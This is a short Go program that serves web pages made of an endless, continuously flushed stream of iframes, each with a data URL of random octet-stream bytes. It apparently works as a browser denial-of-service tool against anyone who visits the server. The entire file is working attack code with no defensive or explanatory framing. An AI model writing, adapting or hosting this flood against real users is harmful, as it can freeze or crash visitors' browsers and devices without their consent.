// Send infinite data-URL iframes.

package main

import (
	"encoding/base64"
	"math/rand"
	"net/http"
)

func main() {
	http.HandleFunc("/", flood)
	http.ListenAndServe(":8080", nil)
}

func flood(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	flusher, ok := w.(http.Flusher)
	if !ok {
		return
	}
	data := make([]byte, 16)
	head := []byte("<iframe src=\"data:application/octet-stream;base64,")
	foot := []byte("\"></iframe>")
	for {
		for i := 0; i < 100; i++ {
			_, err := w.Write(head)
			if err != nil {
				return
			}
			rand.Read(data)
			encoder := base64.NewEncoder(base64.StdEncoding, w)
			_, err = encoder.Write(data)
			if err != nil {
				return
			}
			encoder.Close()
			_, err = w.Write(foot)
			if err != nil {
				return
			}
		}
		flusher.Flush()
	}
}
